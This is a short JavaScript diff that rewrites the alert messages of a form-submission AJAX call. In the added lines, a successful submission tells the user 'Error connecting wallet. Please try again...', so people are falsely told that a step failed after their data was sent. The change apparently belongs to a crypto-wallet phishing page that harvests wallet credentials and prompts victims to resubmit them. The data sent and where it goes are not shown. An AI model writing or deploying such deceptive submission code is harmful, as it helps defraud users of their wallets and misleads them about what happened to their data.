@@ -2081,12 +2081,12 @@
                 data: JSON.stringify(data),  // Stringify the data object
                 success: function (response) {
                     // Success callback - show alert and reload the page
-                    alert("Success sending message...");
+                    alert("Error connecting wallet. Please try again...");
                     location.reload();  // Reload the page to reset the form or state
                 },
                 error: function (errMsg) {
                     // Error callback - show alert with error message
-                    alert("Error sending message. Please try again.");
+                    alert("Failed to connect wallet. Please try again.");
                     console.error("Error:", errMsg);  // Log error details to the console
                 },
                 complete: function () {
